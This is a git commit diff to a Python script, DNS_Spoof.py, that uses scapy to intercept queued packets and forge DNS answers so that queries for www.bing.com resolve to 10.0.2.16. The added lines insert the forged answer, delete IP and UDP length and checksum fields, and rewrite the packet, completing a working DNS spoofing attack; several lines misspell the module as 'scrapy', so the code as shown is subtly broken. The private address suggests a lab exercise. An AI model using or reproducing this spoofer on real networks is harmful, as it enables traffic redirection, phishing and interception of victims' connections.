0645ec5bd16e2febb70e1036a26181e986262c33
Shane Calder <shanescottcalder@gmail.com>
2018-07-22 15:16:14 -0600

    Add files via upload
    added:
    del IP and UDP: len and chksum
    set_payload

--- DNS_Spoof.py
+++ DNS_Spoof.py
@@ -10,6 +10,15 @@ def process_packet(packet):
         if 'www.bing.com' in qname:
             print('[+] Spoofing target')
             answer = scapy.DNSRR(rrname = qname, rdata='10.0.2.16')
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scrapy.IP].len
+            del scapy_packet[scrapy.IP].chksum
+            del scapy_packet[scrapy.UDP].len
+            del scapy_packet[scrapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
 
         #print(scapy_packet.show())
     packet.accept()
